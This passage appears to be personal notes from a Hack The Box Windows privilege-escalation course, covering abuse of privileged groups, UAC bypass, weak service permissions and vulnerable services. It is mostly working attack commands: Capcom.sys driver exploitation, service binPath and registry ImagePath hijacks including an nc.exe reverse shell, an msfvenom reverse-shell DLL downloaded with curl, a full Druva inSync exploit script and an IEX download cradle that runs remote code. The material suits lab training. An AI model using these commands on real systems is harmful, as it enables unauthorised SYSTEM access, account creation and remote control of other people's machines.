e could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

### Creating a WPAD Record
Another way to abuse DnsAdmins group privs is by creating a WPAD record.
Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack.

By default Web Proxy Automated Discovery Protocol (*WPAD*) and Intra-site Automatic Tunnel Addressing Protocol (*ISATAP*) are on the global query block list. These are vulnerable to hijacking, and any domain user can create a computer object or DNS record containing these names. 

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling Global Query Block List
We first need to disable the global query block list:
```powershell-session
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

#### Adding a WPAD Record
Next we add a *WPAD* record pointing to our attack machine.
```powershell-session
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address OURIP
```

## Hyper-V Administrators
The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines)
If DCs have been virutalized then the virtualization admins are domain admins.
Easily create a clone of the live controller and obtain the `NTDS.dit` file and extract the hashes for all users in that domain.

Upon deleting a virtual machine, *vmms.exe* attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\SYSTEM` without impersonating the user. We can delete the `.vhdx` file and create a native hard link to a protected system file.

If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

## Print Operators
[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.
If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.
### Confirming Privs
```
whoami /priv
```
The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses

Its well known that the driver `capcom.sys` contains functionality that allows users to execute shell code with `SYSTEM` privs. We can use our user privs to load this driver and escalate. 

We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
next we can compile it with `cl.exe` 
```cmd-session
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`
Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
```cmd-session
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
```cmd-session
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

#### Verify Driver is not loaded
Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.
```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```
#### Verify Privs are enabled
Run the `EnableSeLoadDriverPrivilege.exe` binary.
```cmd-session
EnableSeLoadDriverPrivilege.exe
whoami /priv
```
#### Verify Capcom Driver is Listed
next we verify the capcom driver is listed.
```powershell-session
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
#### Using ExploitCapcom Tool to Escalate Privs
To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.
```powershell-session
.\ExploitCapcom.exe
```

### Alternative Exploit - No GUI
if we dont have access to a GUI we have to modify `ExploitCapcom.cpp` 
we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

We then would set up a listener 

### Automating steps
#### Automating with EopLoadDriver
We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:
```cmd-session
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

## Server Operators
```
prereqs
Member of the server operators group
service that starts with SYSTEM
```

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

### App Readiness Service
#### Querying the App Readiness Service
We can confirm the `AppReadiness` service starts as SYSTEM using the `sc.exe` utility.
```cmd-session
sc qc AppReadiness
```

#### Checking Service Permissions with PsService
We can use the `psservice` service viewer/controller which is part of `sysinternals` to check permissions on a service. 
```cmd-session
c:\Tools\PsService.exe security AppReadiness
```

#### Checking Local Admin Group Membership
```cmd-session
net localgroup Administrators
```

#### Modifying Service Binary
```cmd-session
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

#### Starting the Service
```cmd-session
sc start AppReadiness
```
***The service should fail***

#### Confirming Local Admin Membership
```cmd-session
net localgroup Administrators
```

#### Post Exploitation: Retrieving Hashes
```shell-session
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

## UAC
[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities.
Applications have different integrity levels. When *UAC* is activated, tasks always run under the context of a non-admin unless an admin specifically authorizes.

***10 UAC Group Policy Settings***

|Group Policy Setting|Registry Key|Default Setting|
|---|---|---|
|[User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)|FilterAdministratorToken|Disabled|
|[User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)|EnableUIADesktopToggle|Disabled|
|[User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)|ConsentPromptBehaviorAdmin|Prompt for consent for non-Windows binaries|
|[User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)|ConsentPromptBehaviorUser|Prompt for credentials on the secure desktop|
|[User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)|EnableInstallerDetection|Enabled (default for home) Disabled (default for enterprise)|
|[User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)|ValidateAdminCodeSignatures|Disabled|
|[User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)|EnableSecureUIAPaths|Enabled|
|[User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)|EnableLUA|Enabled|
|[User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)|PromptOnSecureDesktop|Enabled|
|[User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)|EnableVirtualization|Enabled|
*UAC* may not stop an attacker gaining privs but will show them down.
The `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in.
##### Checking Current User
```cmd-session
whoami /user
```
##### Confirming Admin Group Membership
```cmd-session
net localgroup administrators
```

#### Confirming UAC is Enabled
```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
#### Checking UAC Level
```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
#### Checking Windows Versionn
```powershell-session
[environment]::OSVersion.Version
```
We then CrossRef [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page
The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses.

There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.
the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

```
When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.
```

### UAC Bypass
#### Reviewing Path Variable
Let's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.
```powershell-session
cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```
We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

#### Generating a Malicious DLL
```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
#### Downloading DLL
```powershell-session
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Executing SystemPropertiesAdvanced.exe on Target Host
Before proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.
```cmd
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```
Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.
```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## Weak Permissions
We need to understand how permission misconfiguration can be used to escalate privs.
Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system.

### Permissive File Systems ACLs
#### Running SharpUp
We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
```powershell-session
.\SharpUp.exe audit
```
This identifies weak services.

#### Checking Permissions with icacls
Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
```powershell-session
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

#### Replacing Service Binary
This service can be started by unprivileged users and we can replace the binary with a malicious *msfvenom* binary to give us a reverse shell as `system`.
```cmd-session
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
```cmd-session
sc start SecurityService
```

### Weak Service Permissions
#### Reviewing Sharpup again
Checking *sharpup* we see *WindscribeService* is potentially misconfigured.

#### Checking Permissions with AccessChk
Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service.
We will use the flags:
`-q omit banner`
`-u supress errors`
`-v verbose`
`-c specify name of windows service`
`-w show objects with only write access`
```cmd-session
accesschk.exe /accepteula -quvcw WindscribeService
```
Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

#### Changing the Service Binary Path
We can use our permissions to change the binary path maliciously.
```cmd-session
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
#### Restarting Service
```cmd-session
sc stop WindscribeService
```
```cmd-session
sc start WindscribeService
```

***Clean it up!***

### Unquoted Service Path
When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.
```shell-session
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`
If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.
- `C:\Program.exe\`
- `C:\Program Files (x86)\System.exe`
#### Searching for Unquoted Service Paths
```cmd-session
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Permissive Registry ACLs
It is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.
```cmd-session
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

#### Changing ImagePath with PowerShell
We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:
```powershell-session
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
### Modifiable Registry Autorun Binary
#### Check Startup Programs
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```powershell-session
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

## Kernel Exploits
It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal.
Could be Kernel exploits

```shell-session
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```
### Enumerating missing patches
The first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.
#### Examining Installed Updates
```powershell-session
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```
```cmd-session
wmic qfe list brief
```
[Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808)

## Vulnerable Services
We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization.

#### Enumerating Installed Programs
```cmd-session
wmic product get name
```
We check which applications stand out and are not part of the standard windows suite.

#### Enumerating Local Ports
```cmd-session
netstat -ano | findstr PORT
```
From this we can then enumerate the process ID
#### Enumerating Process ID
```powershell-session
get-process -Id PID
```

### Druva inSync Windows Client Local Priv Escalation
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Here we can change the `$cmd` variable to our desired command
We can use `Invoke-PowerShellTcp.ps1` 
```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```
